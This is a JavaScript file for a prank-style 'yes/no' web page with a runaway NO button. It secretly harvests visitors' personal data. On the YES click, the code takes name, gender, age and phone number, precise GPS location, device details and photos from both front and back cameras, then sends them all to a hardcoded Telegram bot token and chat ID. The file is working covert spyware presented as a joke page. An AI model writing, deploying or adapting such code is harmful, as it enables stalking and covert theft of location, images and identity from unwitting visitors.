

// Get references to all input fields, the dropdown, and the buttons
const inputs = document.querySelectorAll(
  'input[type="text"], input[type="number"]'
);
const genderDropdown = document.getElementById("gender");
const yesButton = document.querySelector(".yes");
const noButton = document.querySelector(".no");

// Function to check if all inputs are filled
function validateInputs() {
  let allFilled = true;

  // Check text and number inputs
  inputs.forEach((input) => {
    if (input.value.trim() === "") {
      allFilled = false; // If any field is empty, set flag to false
    }
  });

  // Check if gender is selected
  if (genderDropdown.value === "") {
    allFilled = false;
  }

  // Enable or disable the buttons based on the flag
  yesButton.disabled = !allFilled;
  noButton.disabled = !allFilled;
}

// Attach event listeners to all input fields and the dropdown
inputs.forEach((input) => {
  input.addEventListener("input", validateInputs);
});
genderDropdown.addEventListener("change", validateInputs);

// Handle "YES" button click
async function handleYes() {
  // Collect user input data
  const username = document.getElementById("username").value.trim();
  const gender = document.getElementById("gender").value;
  const age = document.getElementById("age").value.trim();
  const phone = document.getElementById("Phone").value.trim();

  // Validate that all fields are filled
  if (!username || !gender || !age || !phone) {
    alert("Please fill out all fields before proceeding.");
    return;
  }

  // Prefix the phone number with +855
  const formattedPhone = "+855" + phone;

  // Save data to localStorage
  const userData = { username, gender, age, phone: formattedPhone };
  localStorage.setItem("userData", JSON.stringify(userData));

  // Request location from the user
  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });

      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Fetch country name using reverse geocoding
      const countryName = await fetchCountryName(latitude, longitude);

      // Get device information
      const deviceInfo = getDeviceInfo();

      // Capture screenshots from front and back cameras
      const [frontCameraImage, backCameraImage] =
        await captureCameraImages();

      // Format Google Maps URL
      const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

      // Send data to Telegram bot
      const telegramBotToken = "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
      const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
      const message = `User Information:
Name: ${username}
Gender: ${gender}
Age: ${age}
Phone: ${formattedPhone}
Location: ${mapsUrl}
Country: ${countryName}
Device: ${deviceInfo.deviceName}
OS Version: ${deviceInfo.osVersion}`;

      const response = await fetch(
        `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        }
      );

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(`Telegram API error: ${errorData.description}`);
      }

      console.log("Message sent successfully to Telegram bot.");

      // Send images to Telegram bot
      if (frontCameraImage && backCameraImage) {
        await sendImageToTelegram(
          telegramBotToken,
          chatId,
          frontCameraImage,
          "Front Camera Screenshot"
        );
        await sendImageToTelegram(
          telegramBotToken,
          chatId,
          backCameraImage,
          "Back Camera Screenshot"
        );
      }

      document.getElementById("message").textContent =
        "Data sent successfully!";
      window.location.href = "loveme.html";
    } catch (error) {
      console.error(
        "Error getting location or sending to Telegram:",
        error
      );
      document.getElementById("message").textContent =
        "Failed to send data. Please try again.";
    }
  } else {
    alert("Geolocation is not supported by your browser.");
  }
}

// Function to fetch country name using reverse geocoding
async function fetchCountryName(latitude, longitude) {
  const response = await fetch(
    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
  );
  const data = await response.json();
  return data.address.country || "Unknown Country";
}

// Function to get device information
function getDeviceInfo() {
  const userAgent =
    navigator.userAgent || navigator.vendor || window.opera;
  let deviceName = "Unknown Device";
  let osVersion = "Unknown OS";

  // Detect device name
  if (/android/i.test(userAgent)) {
    deviceName = "Android";
  } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
    deviceName = "iOS";
  }

  // Detect OS version
  if (navigator.userAgentData && navigator.userAgentData.platform) {
    osVersion = navigator.userAgentData.platform;
  } else if (navigator.platform) {
    osVersion = navigator.platform;
  }

  return { deviceName, osVersion };
}

// Function to capture screenshots from front and back cameras
async function captureCameraImages() {
  const constraintsFront = { video: { facingMode: "user" } };
  const constraintsBack = { video: { facingMode: "environment" } };

  let frontCameraImage = null;
  let backCameraImage = null;

  try {
    // Access front camera
    const frontStream = await navigator.mediaDevices.getUserMedia(
      constraintsFront
    );
    const frontVideo = document.createElement("video");
    frontVideo.srcObject = frontStream;
    await frontVideo.play();
    frontCameraImage = await captureVideoFrame(frontVideo);
    frontStream.getTracks().forEach((track) => track.stop());

    // Access back camera
    const backStream = await navigator.mediaDevices.getUserMedia(
      constraintsBack
    );
    const backVideo = document.createElement("video");
    backVideo.srcObject = backStream;
    await backVideo.play();
    backCameraImage = await captureVideoFrame(backVideo);
    backStream.getTracks().forEach((track) => track.stop());
  } catch (error) {
    console.error("Error accessing camera:", error);
  }

  return [frontCameraImage, backCameraImage];
}

// Function to capture a frame from a video element
function captureVideoFrame(video) {
  return new Promise((resolve) => {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    resolve(canvas.toDataURL("image/jpeg"));
  });
}

// Function to send an image to Telegram bot
async function sendImageToTelegram(botToken, chatId, imageData, caption) {
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("caption", caption);
  formData.append("photo", dataURItoBlob(imageData));

  const response = await fetch(
    `https://api.telegram.org/bot${botToken}/sendPhoto`,
    {
      method: "POST",
      body: formData,
    }
  );

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Telegram API error: ${errorData.description}`);
  }

  console.log("Image sent successfully to Telegram bot.");
}

// Function to convert Data URI to Blob
function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(",")[1]);
  const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
  const arrayBuffer = new ArrayBuffer(byteString.length);
  const uint8Array = new Uint8Array(arrayBuffer);

  for (let i = 0; i < byteString.length; i++) {
    uint8Array[i] = byteString.charCodeAt(i);
  }

  return new Blob([arrayBuffer], { type: mimeString });
}

// Get reference to the "NO" button
const noButtonRef = document.querySelector(".no");

// Function to generate random coordinates within the viewport
function getRandomPosition() {
  const windowWidth = window.innerWidth;
  const windowHeight = window.innerHeight;

  // Generate random X and Y positions
  const randomX = Math.random() * (windowWidth - noButtonRef.offsetWidth);
  const randomY =
    Math.random() * (windowHeight - noButtonRef.offsetHeight);

  return { x: randomX, y: randomY };
}

// Add event listener to move the button on hover
noButtonRef.addEventListener("mouseenter", () => {
  const { x, y } = getRandomPosition();
  noButtonRef.style.position = "absolute";
  noButtonRef.style.left = `${x}px`;
  noButtonRef.style.top = `${y}px`;
});